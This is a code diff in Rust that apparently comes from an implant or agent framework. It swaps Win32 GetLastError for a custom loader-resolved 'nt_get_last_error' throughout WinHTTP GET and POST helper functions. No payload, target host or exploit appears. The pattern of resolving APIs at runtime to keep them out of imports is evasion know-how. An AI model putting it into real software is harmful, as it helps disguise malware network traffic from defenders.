@@ -7,8 +7,8 @@ use core::ptr::{null, null_mut};
 use core::sync::atomic::{AtomicBool, Ordering};
 
 use mod_agentcore::instance;
-use mod_agentcore::ldr::ldr_function_addr;
-use rs2_win32::ntdef::{GetLastError, UnicodeString};
+use mod_agentcore::ldr::{ldr_function_addr, nt_get_last_error};
+use rs2_win32::ntdef::UnicodeString;
 use rs2_win32::winhttp::{
     WinHttp, WinHttpError, HTTP_QUERY_STATUS_CODE, WINHTTP_ACCESS_TYPE_NO_PROXY,
     WINHTTP_FLAG_BYPASS_PROXY_CACHE, WINHTTP_FLAG_SECURE, WINHTTP_QUERY_FLAG_NUMBER,
@@ -157,7 +157,7 @@ pub unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> 
         null_mut(),
     );
     if b_status_code == 0 {
-        let error = GetLastError();
+        let error = nt_get_last_error();
         return Err(format!(
             "WinHttpQueryHeaders failed with error: {}",
             WinHttpError::from_code(error as i32)
@@ -209,7 +209,7 @@ pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
             0,
         );
         if h_session.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             return Err(format!(
                 "WinHttpOpen failed with error: {}",
                 WinHttpError::from_code(error as i32)
@@ -232,7 +232,7 @@ pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
         );
 
         if h_connect.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
                 "WinHttpConnect failed with error: {}",
@@ -250,7 +250,7 @@ pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
             WINHTTP_FLAG_BYPASS_PROXY_CACHE | secure_flag,
         );
         if h_request.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
@@ -262,7 +262,7 @@ pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
         let b_request_sent =
             (get_winhttp().win_http_send_request)(h_request, null(), 0, null(), 0, 0, 0);
         if b_request_sent == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
@@ -274,7 +274,7 @@ pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
 
         let b_response_received = (get_winhttp().win_http_receive_response)(h_request, null_mut());
         if b_response_received == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
@@ -319,7 +319,7 @@ pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> 
             0,
         );
         if h_session.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             return Err(format!(
                 "WinHttpOpen failed with error: {}",
                 WinHttpError::from_code(error as i32)
@@ -342,7 +342,7 @@ pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> 
         );
 
         if h_connect.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
                 "WinHttpConnect failed with error: {}",
@@ -360,7 +360,7 @@ pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> 
             WINHTTP_FLAG_BYPASS_PROXY_CACHE | secure_flag,
         );
         if h_request.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
@@ -379,7 +379,7 @@ pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> 
             0,
         );
         if b_request_sent == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
@@ -391,7 +391,7 @@ pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> 
 
         let b_response_received = (get_winhttp().win_http_receive_response)(h_request, null_mut());
         if b_response_received == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
